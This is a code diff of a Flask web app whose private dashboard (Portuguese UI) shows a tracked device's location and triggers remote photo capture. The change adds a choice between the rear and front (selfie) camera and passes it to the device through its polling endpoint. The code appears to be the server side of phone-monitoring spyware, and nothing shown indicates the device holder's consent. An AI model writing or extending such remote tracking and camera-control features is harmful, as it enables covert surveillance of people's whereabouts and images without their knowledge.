@@ -30,7 +30,12 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box strong { font-size: 16px; color: #f1f5f9; }
         .map-container { width: 100%; height: 300px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
-        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 12px; }
+        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 15px; }
+        
+        .cam-selector-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .cam-selector-box label { font-size: 11px; color: #64748b; text-transform: uppercase; }
+        .cam-selector-box select { background: #0d1925; color: #38bdf8; border: 1px solid #1e293b; padding: 6px 12px; border-radius: 4px; font-family: monospace; font-weight: bold; outline: none; cursor: pointer; }
+        
         .btn-camera { display: block; width: 100%; background: #38bdf8; color: #070f15; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; margin-bottom: 15px; }
         .photo-container { width: 100%; border: 1px solid #1e293b; border-radius: 8px; background: #040a0f; text-align: center; overflow: hidden; display: none; margin-top: 10px; }
         .photo-container img { width: 100%; height: auto; display: block; }
@@ -69,6 +74,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     🗺️ Abrir no Google Maps
                 </a>
 
+                <div class="cam-selector-box">
+                    <label>Lente Ativa //</label>
+                    <select id="camSelect">
+                        <option value="0">TRASEIRA (MAIN)</option>
+                        <option value="1">FRONTAL (SELFIE)</option>
+                    </select>
+                </div>
+
                 <button id="btnCam" class="btn-camera" onclick="dispararCaptura()">📸 Capturar Foto Remota</button>
                 
                 <div id="photoFrame" class="photo-container">
@@ -86,10 +99,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 
                 async function dispararCaptura() {
                     const btn = document.getElementById('btnCam');
+                    const cameraEscolhida = document.getElementById('camSelect').value;
                     btn.innerText = "⏳ Capturando...";
                     btn.disabled = true;
                     
-                    await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take'}), headers: {'Content-Type': 'application/json'} });
+                    await fetch('/api/comando_camera/{{ id_buscado }}', { 
+                        method: 'POST', 
+                        body: JSON.stringify({acao: 'take', camera: cameraEscolhida}), 
+                        headers: {'Content-Type': 'application/json'} 
+                    });
                     
                     let checagem = setInterval(async () => {
                         try {
@@ -177,14 +195,17 @@ def update():
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
     
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
-    db_dispositivos[device_id]["cmd_cam"] = "wait"
-    return jsonify({"status": "success", "comando_cam": cmd_cam}), 200
+    target_id_cam = db_dispositivos[device_id].get("target_id_cam", "0")
+    
+    db_dispositivos[device_id]["cmd_cam"] = "wait" 
+    return jsonify({"status": "success", "comando_cam": cmd_cam, "target_id_cam": target_id_cam}), 200
 
 @app.route('/api/comando_camera/<device_id>', methods=['POST'])
 def comando_camera(device_id):
     data = request.get_json(force=True, silent=True) or {}
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
     db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "wait")
+    db_dispositivos[device_id]["target_id_cam"] = data.get("camera", "0")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_camera', methods=['POST'])
